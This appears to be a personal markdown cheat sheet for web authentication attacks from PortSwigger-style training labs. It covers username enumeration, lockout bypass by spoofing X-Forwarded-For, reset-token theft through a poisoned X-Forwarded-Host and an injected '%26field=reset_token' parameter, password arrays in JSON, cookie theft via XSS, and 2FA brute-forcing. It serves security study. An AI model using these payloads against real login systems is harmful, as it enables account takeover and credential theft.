# Authenthication / Brute-Force CHEATSHEET + MOST IMPORTANT LABS

## Key Terms

```bash
X-Forwarded-For  -> bypass ip based brute-force protection
X-Forwarded-Host -> <OUR-SV>
Burp Macros
```

## Walkthrough - Most Important Labs

- [Username-enumeration-via-response-timing+ip-blocked-bypass-via-X-Fowarded-For](Username-enumeration-via-response-timing+ip-blocked-bypass-via-X-Fowarded-For.md) ❗
  
- [Brute-forcing-a-stay-logged-in-cookie-(cookie-easy-to-reproduce-username+md5+b64)](Brute-forcing-a-stay-logged-in-cookie-(cookie-easy-to-reproduce-username+md5+b64).md)

- [Offline-password-cracking (stay-logged-cookie + XSS)](Offline-password-cracking.md)

- [2FA broken login (brute-force to 2fa code)](2FA-broke-login.md)


 ## Methodology
<br>


> Brute force users
```bash
 -> Cluster Bomber Attack -> Grep Extract -> e.g: invalid username/password
      -> ¿username already exists? 
      -> <USERNAME> + <VERY-LONG-PASSWORD> -> show time completed in respose
      -> Sometimes, when attempting to log in as an **existing** user, the server will lock the account after X failed attempts. Create a wordlist that repeats each username 5–10 times 
      -> json? -> try an array of password = brute force in a single request
      -> md5? -> while read -r i; do print  "$i" | md5sum | cut -d ' ' -f1; done < portswigger-password.txt > portswigger-pass-md5sum.txt
```
<br>

> Change password?
```  bash
  -> Brute-force the current password and in the new password field enter <pass1> <pass2>
      > If the current password is correct, it will show an error message because your new passwords do not match	
```
<br>
    
> Forgot password? 
```bash
    -> Reuse temporal token 			
	-> X-Forwarded-Host: <exploit-sv> -> send token in our email
    -> Try exfiltrate the token from the api -> username=administrator%26field=reset_token%23

```
<br>

> Stay-Login?
```bash
  -> verify if the cookie is easy to reproduce, e.g -> hash md5 + user prefix + encode b64
  -> steal the cookie (xss) and crack the hash offline
```

<br>

> Cookie predecible?
```bash
    -> <username>:<password-hash> base64
    -> <username>:<password+timestamp-hash>
    -> Hash? -> find the type with tools like john-the-ripper,hashid,crackstation(online)...
```
<br>

> 2FA?
```bash
    -> Attempt to bypass the second verification, e.g. -> first login + GET /my-account?username=carlos
    -> Generate 2fa code to victim and brute-force to 2fa code
    -> login1 (wiener) + login2 (send token to carlos) -> brute force mfa
	  -> macro + brute force mfa
```
<br>

> LOGIN BLOCKED?
```bash
- json? -> try an array of password = brute force in a single request, eg -> {"username":"carlos","password":["foo1","foo2","foo3..."]} 
- IP based block? -> Pitchforked attack ->  X-Forwarded-For: <IP-INTRUDER+1> + <USERNAME> + <PASSWORD> 
```



